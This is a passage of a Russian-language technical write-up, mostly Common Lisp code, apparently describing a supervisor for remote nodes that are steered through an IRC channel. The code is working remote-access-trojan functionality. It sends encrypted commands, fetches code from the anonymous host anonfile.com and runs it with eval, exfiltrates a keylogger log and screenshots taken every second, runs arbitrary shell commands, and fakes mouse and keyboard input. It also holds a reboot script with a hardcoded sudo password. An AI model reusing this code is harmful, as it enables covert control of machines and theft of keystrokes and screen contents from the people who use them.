Полученную команду уже вполне можно посылать в канал и, если узел получил и
выполнил команду, он вернет результат в канал, например так:
</p>

<pre class="example">
&lt;b3784752939&gt; =&gt; "ALFA"
</pre>

<p>
Мы можем обьединить закачку кода и отправку команды в одну операцию, для
удобства:
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orgdd9cc75">;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; encrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

(defun upload-code-and-send (code key seed)
  (let* ((code-link (upload-code code key))
         (cmd (format nil "(update \"~A\" ~A)" code-link key))
         (enc (encode cmd seed)))
    (sendmsg enc)))

;; (upload-code-and-send "(alfa)" 1234567890 3784753813)
</pre>
</div>

<p>
В этом тестовом примере узел должен выполнить <code>ALFA</code> и выдать в канал
результат выполнения (число 1).
</p>

<p>
Чтобы все сработало, <code>на узле</code> нужно определить функцию <code>UPDATE</code>, которая
будет получать ссылку на файл с кодом, скачивать и расшифровывать его а потом
применять:
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org4d1aeaa">;; anon_file_download
(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-download-link (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings
              "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
              str)
           (when match-p (return (aref result 0))))))

(defun anon-file-download (filename)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request (format nil "https://anonfile.com~A" filename)
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (link (get-download-link text)))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request link
             :user-agent *user-agent*
             :cookie-jar cookie-jar
             :additional-headers *additional-headers*
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

(defun update (link key)
  (let* ((base64 (anon-file-download link))
         (oct    (decrypt base64 key))
         (cmd    (flex:octets-to-string oct :external-format :utf-8))
         (result (handler-case (bprint (eval (read-from-string cmd)))
                   (t (err)
                     (dbg "::irc-cmd error: ~A~%" (type-of err))
                     (sendmsg "ERR(irc-cmd): [~A]" (type-of err))
                     (return-from update nil)))))
    result))

;; (update "/3444C7Dbna/u-3784602724" 1234567890)
</pre>
</div>
</div>

<div id="outline-container-org9a21466" class="outline-3">
<h3 id="org9a21466">File obtaining</h3>
<div class="outline-text-3" id="text-org9a21466">
<p>
Воспользуемся этим механизмом, чтобы сформировать какую-то новую
функциональность, которая не была определена ранее. Например, попросим
узел загрузить на файлообменник какой-нибудь файл.
</p>

<p>
Для этого надо определить процедуру, которую у оператора уже есть -
<code>upload-code</code> (она определена в разделе выше). Но эта процедура не
включена в код супервизора, исполняющийся на удаленной машине (поправка:
в новом релизе - уже включена, но неважно). Эта процедура вызывает внутри
себя <code>encrypt</code> и <code>anon-file-upload</code>, которые уже на удаленном узле
определены.
</p>

<p>
Чтобы отослать нам понадобится текущий <code>seed</code> получателя, который мы
можем взять из его сообщений в канале и сохранить в переменную
<b>receiver</b>. Также определим ключ, чтобы закрыть код от файлообменника.
</p>

<p>
Формируем строку и отсылаем:
</p>

<div class="org-src-container">
<pre class="src src-lisp">(defparameter *receiver* 3785297487)
(defparameter *tmpkey* 1234567890)

(upload-code-and-send
 "(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil \"u-~A\" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))"
 *tmpkey*
 *receiver*)
</pre>
</div>

<p>
Теперь, вызвав свежеопределенную процедуру, мы можем закачать собственный
код на файлообменник и получить на него ссылку:
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org48c3304">(defparameter *receiver* 3785300360)
(defparameter *tmpkey* 1234567890)

;; (upload-code-and-send
;;  (format
;;   nil
;;   "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
;;   *tmpkey*)
;;  *tmpkey*
;;  *receiver*)

;; (alexandria:write-string-into-file
;;  (download-and-decrypt "/T364z1F3n9/u-3785296327" *tmpkey*)
;;  "keylog3.log")
</pre>
</div>

<p>
По этой ссылке скачать файл себе и расшировать его:
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org35d177a">(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)
</pre>
</div>
</div>
</div>

<div id="outline-container-orgd5f6f19" class="outline-3">
<h3 id="orgd5f6f19">Replace yourself</h3>
<div class="outline-text-3" id="text-orgd5f6f19">
<p>
Теперь выполним обратную операцию - загрузим файл на узел - например
новую версию себя:
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org867b796">(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun replace-yourself (link key)
  (alexandria:write-string-into-file
   (download-and-decrypt link key)
   "q.lisp" :if-exists :supersede)
  'ok)

;; (upload-code (alexandria:read-file-into-string "q.lisp") 1234567890)
;; =&gt; "/some/file"

;; (defparameter *receiver* 3784783570)
;; (defparameter *tmpkey* 1234567890)

;; (upload-code-and-send
;;  "(replace-yourself \"/some/file\" 1234567890)"
;;  *tmpkey*
;;  *receiver*)
</pre>
</div>
</div>
</div>

<div id="outline-container-org36e4b53" class="outline-3">
<h3 id="org36e4b53">Run program</h3>
<div class="outline-text-3" id="text-org36e4b53">
<p>
Аналогичным образом добавляем возможность запускать команды на удаленном
узле. Следует помнить, что запуск полностью синхронный, поэтому следует
добавлять амперсанд (&amp;) в конце команды, чтобы не ждать ее завершения.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org0257832">(defvar *shell-search-paths* '("/usr/bin/" "/usr/local/bin/"))

(defparameter *bourne-compatible-shell* "/bin/sh"
  "The path to a Bourne compatible command shell in
physical pathname notation.")

(defun directory-pathname-p (pathname)
  "Does `pathname` syntactically  represent a directory?
  ---
  A directory-pathname is a pathname _without_ a filename. The three
  ways that the filename components can be missing are for it to be `nil`,
  `:unspecific` or the empty string.
  "
  (flet ((check-one (x)
           (not (null (member x '(nil :unspecific "")
                              :test 'equal)))))
    (and (check-one (pathname-name pathname))
         (check-one (pathname-type pathname)))))

(defmacro with-gensyms (syms &amp;body body)
  `(let ,(mapcar #'(lambda (s)
                     `(,s (gensym)))
                 syms)
     ,@body))

(defmacro with-stream-from-specifier ((stream)
                                      &amp;body body)
  (with-gensyms (s close? result)
    `(let ((,close? t)
           ,s
           ,result)
       (unwind-protect
            (setf ,result
                  (multiple-value-list
                   (let (,stream)
                     (setf (values ,s ,close?)
                           nil)
                     (setf ,stream ,s)
                     ,@body)))
         (when (and ,close? ,s)
           (let ((it (close-stream-specifier ,s)))
             (when it
               (setf (first ,result) it)))))
       (values-list ,result))))

(defmacro with-input ((var) &amp;body body)
  "Create an input stream from source and bind it to var within the body of the with-input form. The stream will be closed if necessary on exit."
  `(with-stream-from-specifier (,var)
     ,@body))

(defun close-stream-specifier (s)
  (if (equal (type-of s) 'string-stream)
      (prog1
          (values (get-output-stream-string s))
        (close s))
      ;; else
      (progn
        (close s)
        (values nil))))

(defun file-to-string-as-lines (stream)
  (with-output-to-string (s)
    (loop for line = (read-line stream nil :eof nil)
       until (eq line :eof) do
         (princ line s)
         (terpri s))))

(defun %shell-command (command)
  (with-input (input-stream)
    (let* ((process (sb-ext:run-program
                     *bourne-compatible-shell*
                     (list "-c" command)
                     :wait nil :input input-stream
                     :output :stream
                     :error :stream))
           (output-thread (sb-thread:make-thread
                           #'(lambda ()
                               (file-to-string-as-lines
                                (sb-impl::process-output process)))))
           (error-thread (sb-thread:make-thread
                          #'(lambda ()
                              (file-to-string-as-lines
                               (sb-impl::process-error process))))))
      (let ((error-code
             (sb-impl::process-exit-code (sb-impl::process-wait process)))
            (output-string (sb-thread:join-thread output-thread))
            (error-string (sb-thread:join-thread error-thread)))
        (close (sb-impl::process-output process))
        (close (sb-impl::process-error process))
        (values output-string error-string error-code)))))

(defun find-command-ending-in-string (command)
  (let ((checking? t))
    (loop for ch across command
       for i from 0 do
         (cond ((and checking? (char= ch #\Space))
                (return i))
               ((char= ch #\\)
                (setf checking? nil))
               (t
                (setf checking? t))))))


(defun shell-command (command)
  "Synchronously execute `command` using a Bourne-compatible shell,
   returns (values output error-output exit-status).
   --
   The `command` can be a full path to a shell executable binary
   or just its name. In the later case, the variable `*shell-search-paths*`
   will be used to find the executable.
   --
   Depending on the implementation, the variable `*bourne-compatible-shell*`
   may be used to find a shell to use in executing `command`."
  (let* ((pos-/ (position #\/ command))
         (pos-space (find-command-ending-in-string command))
         (binary (subseq command 0 (or pos-space)))
         (args (and pos-space (subseq command pos-space))))
    (when (or (not pos-/)
              (and pos-/ pos-space)
              (and pos-space
                   (&lt; pos-/ pos-space)))
      ;; no slash in the command portion, try to find the command with
      ;; our path
      (setf binary
            (or (loop for path in *shell-search-paths* do
                     (let ((full-binary (make-pathname :name binary
                                                       :defaults path)))
                       (when (and (probe-file full-binary)
                                  (directory-pathname-p full-binary))
                         (return full-binary))))
                binary)))
    (multiple-value-bind (output error status)
        (%shell-command (format nil "~a~@[ ~a~]" binary args))
      (values output error status))))
</pre>
</div>

<p>
Тут приведен пример запуска, написанный в расчете на то, что предыдущий
блок упакован в строку, размещенную в переменной <code>*CODE*</code>.
</p>

<p>
Также есть примеры запуска на удаленном узле
</p>
<ul class="org-ul">
<li>броузера (как пример GUI-программы которая есть везде)</li>
<li>команды которая используется, чтобы понять, запущен ли броузер (она
подсчитывает процессы с именами "firefox")</li>
<li>закрытия броузера (как пример завершения процессов, запущенных
асинхронно)</li>
<li>проверки определена ли процедура (так можно определять, какие features
поддерживаются в этой инсталляции супервизора узла в текущий момент)</li>
<li>удаления определения процедуры (оно необходимо, т.к. без него
переопределение ловится процедурой игнорирования ошибки)</li>
</ul>

<div class="org-src-container">
<pre class="src src-lisp">(defparameter *receiver* 3784780565)

(defparameter *tmpkey* 3784780565)

(upload-code-and-send
 *code*
 *tmpkey*
 *receiver*)

(upload-code-and-send
 "(uiop:run-program \"firefox &amp;\")"
 *tmpkey*
 *receiver*)

(upload-code-and-send
 "(shell-command \"ps aux | grep firefox | wc -l\")"
 *tmpkey*
 *receiver*)

(upload-code-and-send
 "(shell-command \"killall firefox\")"
 *tmpkey*
 *receiver*)

(upload-code-and-send
 "(fboundp 'shell-command)"
 *tmpkey*
 *receiver*)

(upload-code-and-send
 "(setf *sleep-interval* 300)"
 *tmpkey*
 *receiver*)



(upload-code-and-send
 "(fmakunbound 'shell-command)"
 *tmpkey*
 *receiver*)
</pre>
</div>
</div>
</div>

<div id="outline-container-orgee5fae5" class="outline-3">
<h3 id="orgee5fae5">Shutdown</h3>
<div class="outline-text-3" id="text-orgee5fae5">
<p>
Чтобы выполнить перезагрузку воспользуемся <code>EXPECT</code>. Скрипт будет таким:
</p>

<div class="org-src-container">
<pre class="src src-tcl" id="orgff179cd">#!/usr/bin/expect -d
spawn sudo reboot
sleep 3
expect {\[sudo\] ?assword* }
send "rfhfrfnbwf\r"
sleep 3
</pre>
</div>

<p>
Вот последовательность команд, которую нужно исполнить, чтобы загрузить и
выполнить скрипт перезагрузки на узле. Следует помнить, что после
перезагрузки узел не выйдет в сеть, если на нем не установлен автологин.
</p>

<div class="org-src-container">
<pre class="src src-lisp">(defparameter *receiver* 3784776109)

(defparameter *tmpkey* 1234567890)

(defparameter *code*
  "(alexandria:write-string-into-file
   \"#!/usr/bin/expect -d
   spawn sudo reboot
   sleep 3
   expect {\\[sudo\\] ?assword* }
   send \\\"rfhfrfnbwf\\\\r\\\"
   sleep 3
   \"
   \"rbt.sh\" :if-exists :supersede)
")

(upload-code-and-send
 *code*
 *tmpkey*
 *receiver*)

(upload-code-and-send
 "(shell-command \"ls -la| grep rbt\")"
 *tmpkey*
 *receiver*)

(upload-code-and-send
 "(shell-command \"chmod +x rbt.sh\")"
 *tmpkey*
 *receiver*)

(upload-code-and-send
 "(shell-command \"./rbt.sh\")"
 *tmpkey*
 *receiver*)
</pre>
</div>
</div>
</div>

<div id="outline-container-org6719226" class="outline-3">
<h3 id="org6719226">Remote GUI: moving &amp; actions</h3>
<div class="outline-text-3" id="text-org6719226">
<div class="org-src-container">
<pre class="src src-elisp" id="orgd6c81e8">(org-entry-get nil prop t)
</pre>
</div>

<p>
Для управления GUI-программами на узле нам нужны возможности по
управлению мышью. Тут приведен код, функции которого можно вызывать.
</p>

<p>
<code>perform-mouse-action</code> создает фейковое событие мышки, а
<code>perform-key-action</code> создает фейковое событие клаиватуры. Обе функции
принимают первым параметров <code>t</code> или <code>nil</code>, что соответствует "нажать" и
"отпустить", затем <code>keysym</code>.
</p>

<p>
<code>perform-mouse-action</code> принимает еще и координаты, куда следует кликнуть
"мышкой".
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org282a2d5">(defun x-move (x y)
  (if (and (integerp x) (integerp y))
      (with-default-display-force (d)
        (xlib/xtest:fake-motion-event d x y))
      (error "Integer only for position, (x: ~S, y: ~S)" x y)))

(defun mklist (obj)
  (if (and
       (listp obj)
       (not (null obj)))
      obj (list obj)))

(defmacro defun-with-actions (name params actions &amp;body body)
  ;; "This macro defun a function which witch do mouse or keyboard actions,
  ;; body is called on each action."
  `(defun ,name ,params
     (mapcar
      #'(lambda (action)
          ,@body)
      (mklist ,actions))))

(defun perform-mouse-action (press? button &amp;key x y)
  (and x y (x-move x y))
  (with-default-display-force (d)
    (xlib/xtest:fake-button-event d button press?)))

(defun perform-key-action (press? keycode) ; use xev to get keycode
  (with-default-display-force (d)
    (xlib/xtest:fake-key-event d keycode press?)))

(macrolet ((def (name actions)
             `(defun-with-actions ,name
                  (&amp;key (button 1) x y)
                ,actions
                (funcall #'perform-mouse-action
                         action button :x x :y y))))
  (def x-mouse-down t)
  (def x-mouse-up nil)
  (def x-click '(t nil))
  (def x-dbclick '(t nil t nil)))

(defmacro with-scroll (pos neg clicks x y)
  `(let ((button (cond
                   ((= 0 ,clicks) nil)
                   ((&gt; 0 ,clicks) ,pos)    ; scroll up/right
                   ((&lt; 0 ,clicks) ,neg)))) ; scroll down/left
     (dotimes (_ (abs ,clicks))
       (x-click :button button :x ,x :y ,y))))

(defun x-vscroll (clicks &amp;key x y)
  (with-scroll 4 5 clicks x y))

(defun x-scroll (clicks &amp;key x y)
  (x-vscroll clicks :x x :y y))

(defun x-hscroll (clicks &amp;key x y)
  (with-scroll 7 6 clicks x y))

(macrolet ((def (name actions)
             `(defun-with-actions ,name (keycode)
                ,actions
                (funcall #'perform-key-action
                         action keycode))))
  (def x-key-down t)
  (def x-key-up nil)
  (def x-press '(t nil)))

;; (block perform-key-action-test
;;   (perform-key-action t 116)
;;   (sleep .1)
;;   (perform-key-action nil 116))

;; (defparameter *mouse-left* 1)

;; (defparameter *mouse-middle* 2)

;; (block perform-mouse-action-test
;;   (perform-mouse-action t *mouse-left* :x 100 :y 100)
;;   (sleep .1)
;;   (perform-mouse-action nil *mouse-left* :x 100 :y 100))
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-org2e1c846" class="outline-2">
<h2 id="org2e1c846">Snapshot function</h2>
<div class="outline-text-2" id="text-org2e1c846">
<p>
Сама функция скриншота должна каждую секунду делать скриншот, загружать
его на файлообменник, получать ссылку на файл и отправлять ее в
irc-канал.
</p>

<p>
В будущем, когда я добавлю веб-камеру к роботу-пылесосу, такой же процесс
можно будет реализовать и для картинок с неё. Аналогичный процесс
планируется для значений температуры и влажности.
</p>

<p>
За формирование скриншота отвечает кодовый блок <code>x_snapshot</code> и
одноименная функция.
</p>

<p>
Чтобы сократить количество передаваемых данных мы используем несколько
приемов.
</p>

<p>
Во-первых, мы будем передавать двуцветные черно-белые изображения - по
ним легко визуально распознать то что происходит, но при этом мы можем
тратить только один бит на точку. Мы будем упаковывать по 8 таких бит в
байт и формировать PNG-файл с цветовым пространством 256 градаций
серого. За эту часть работы отвечает <code>pack-img</code>.
</p>

<p>

</p>

<p>
[TODO:gmm] Возможно, оптимальнее было бы найти способ сохранять
правильную модель цвета, на это указывает, например вот такой пассаж о
PNG-формате:
</p>

<pre class="example">
В заголовке IHDR указана ширина и высота, глубина цвета (1,2,4,8 или
16 бит) и формат пикселя - Grayscale, RGB, Palette, GrayscaleAlpha,
RGBA, там же тип компрессии (пока что всегда 0: zlib) и тип фильтрации
(тоже всегда 0, что означает 5 фильтров предикторов None, Sub, Up,
Average и Paeth, с выбором одного из 5 в начале каждой строки).
</pre>

<p>
Но это требует глубже разобраться в PNG-формате, хотя и открывает
возможности по управлению сжатием и добавлению текстовых данных в
файлы.
</p>

<p>
Второй способ сократить количество передаваемых данных - передавать не
все изображение, а только те точки, в которых оно отличается от
предыдущего переданного изображения.
</p>

<p>
Однако, в этом случае правильное отображение зависит от того, получил ли
приемник начальное изображение.
</p>

<p>
Решение состоит в том, чтобы передавать полное изображение (ключевой
кадр) один раз в последовательности из нескольких. Остальные изображения
будут содержать только отличающиеся точки относительно предыдущего
состояния. Несмотря на то, что черные точки тоже передаются -
эксперименты показывают, что PNG эффективно сжимает большие черные
участки.
</p>

<p>
Важным моментом тут является то, что в общем случае невозможно
гарантировать успех загрузки изображения на файлообменник. В случае сбоя
мы должны в следующий раз пытаться загрузить "ключевой кадр". Для этого
<code>wrap-img</code> возвращает T в случае успеха и NIL - если произошел сбой.
</p>

<p>
Кроме того, по соображениям безопасности стоит шифровать изображения
после сжатия. Это шифрование нельзя назвать стойким, возможна атака на
открытый текст, так как формат PNG предсказуем. Кроме того, в качестве
ключа мы гамму, генератор которой инициализируется таймштампом узла (в
канале могут быть одновременно несколько узлов).
</p>

<p>
В общем, шифрование так себе ([TODO:gmm]), но большего пока не требуется
даже для отправляемых узлу комманд, хотя тут и существуют угрозы
безопасности.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orga0d3528">;; x_snapshot
(defmacro with-display (host (display screen root-window) &amp;body body)
  `(let* ((,display (xlib:open-display ,host))
          (,screen (first (xlib:display-roots ,display)))
          (,root-window (xlib:screen-root ,screen)))
     (unwind-protect (progn ,@body)
       (xlib:close-display ,display))))

(defmacro with-default-display ((display &amp;key (force nil)) &amp;body body)
  `(let ((,display (xlib:open-default-display)))
     (unwind-protect
          (unwind-protect
               ,@body
            (when ,force
              (xlib:display-force-output ,display)))
       (xlib:close-display ,display))))

(defmacro with-default-display-force ((display) &amp;body body)
  `(with-default-display (,display :force t) ,@body))

(defmacro with-default-screen ((screen) &amp;body body)
  (let ((display (gensym)))
    `(with-default-display (,display)
       (let ((,screen (xlib:display-default-screen ,display)))
         ,@body))))

(defmacro with-default-window ((window) &amp;body body)
  (let ((screen (gensym)))
    `(with-default-screen (,screen)
       (let ((,window (xlib:screen-root ,screen)))
         ,@body))))

(defun x-size ()
  (with-default-screen (s)
    (values
     (xlib:screen-width s)
     (xlib:screen-height s))))

(defparameter *default-x* 0)
(defparameter *default-y* 0)
(defparameter *default-width* 800)
(defparameter *default-height* 600)

(defun init-defaults ()
  (multiple-value-bind (width height)
      (x-size)
    (setf *default-width* width
          *default-height* height
          *default-x* 0
          *default-y* 0)))

(init-defaults)

(defun raw-image-&gt;png (data width height)
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type :truecolor-alpha
                             :image-data data))
         (data (zpng:data-array png)))
    (dotimes (y height)
      (dotimes (x width)
        ;; BGR -&gt; RGB, ref code: https://goo.gl/slubfW
        ;; diffs between RGB and BGR: https://goo.gl/si1Ft5
        (rotatef (aref data y x 0) (aref data y x 2))
        (setf (aref data y x 3) 255)))
    png))

(defun x-snapshot (&amp;key (x *default-x*) (y *default-y*)
                     (width  *default-width*) (height *default-height*)
                     path)
  ;; "Return RGB data array (The dimensions correspond to the height, width,
  ;; and pixel components, see comments in x-snapsearch for more details),
  ;; or write to file (PNG only), depend on if you provide the path keyword"
  (with-default-window (w)
    (let ((image
           (raw-image-&gt;png
            (xlib:get-raw-image w :x x :y y
                                :width width :height height
                                :format :z-pixmap)
            width height)
          ))
      (if path
          (let* ((ext (pathname-type path))
                 (path
                  (if ext
                      path
                      (concatenate 'string path ".png")))
                 (png? (or (null ext) (equal ext "png"))))
            (cond
              (png? (zpng:write-png image path))
              (t (error "Only PNG file is supported"))))
          (zpng:data-array image)))))

;; (x-snapshot :path "x-snapshot-true-color.png")

;; pack_image
(defun pack-img (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash (logand (+ width 7) (lognot 7)) -3))
         (need-finisher (not (equal new-width (ash width -3))))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8)))
         (bp 8)
         (acc 0))
    (declare (type (unsigned-byte 8) acc)
             (type fixnum bp)
             (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (macrolet ((byte-finisher (acc qy qx bp)
                 `(progn
                    ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
                    (setf (aref result ,qy (ash ,qx -3)) ,acc)
                    (setf ,acc 0)
                    (setf ,bp 8))))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx width) (when need-finisher
                            (byte-finisher acc qy qx bp)))
          (declare (type fixnum qx))
          (let* ((avg (floor (+ (aref image qy qx 0)
                                (aref image qy qx 1)
                                (aref image qy qx 2))
                             3))
                 (pnt (ash avg -7)))
            (declare (type fixnum avg))
            (declare (type fixnum pnt))
            (decf bp)
            (setf acc (logior acc (ash pnt bp)))
            (when (= bp 0)
              (byte-finisher acc qy qx bp))))
        ;; (format t "~%")
        ))
    result))

;; (disassemble 'pack-img)

;; TEST: pack-img
;; (time
;;  (let* ((image (pack-img (x-snapshot)))
;;         (dims (array-dimensions image)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              image
;;              :grayscale)))

;; wrap_img
;; get_png_obj
(defun get-png-obj (width height image &amp;optional (color-type :truecolor-alpha))
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type color-type))
         (vector (make-array ;; displaced vector - need copy for save
                  (* height width (zpng:samples-per-pixel png))
                  :displaced-to image :element-type '(unsigned-byte 8))))
    ;; Тут применен потенциально опасный трюк, когда мы создаем
    ;; объект PNG без данных, а потом добавляем в него данные,
    ;; используя неэкспортируемый writer.
    ;; Это нужно чтобы получить третью размерность массива,
    ;; который мы хотим передать как данные и при этом
    ;; избежать создания для этого временного объекта
    (setf (zpng::%image-data png) (copy-seq vector))
    png))

;; get_png_seq
(defun get-png-seq (png)
  (flex:with-output-to-sequence (stream)
    (zpng:write-png-stream png stream)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; wrap-img
(defun wrap-img (frmt-filename-str dims image)
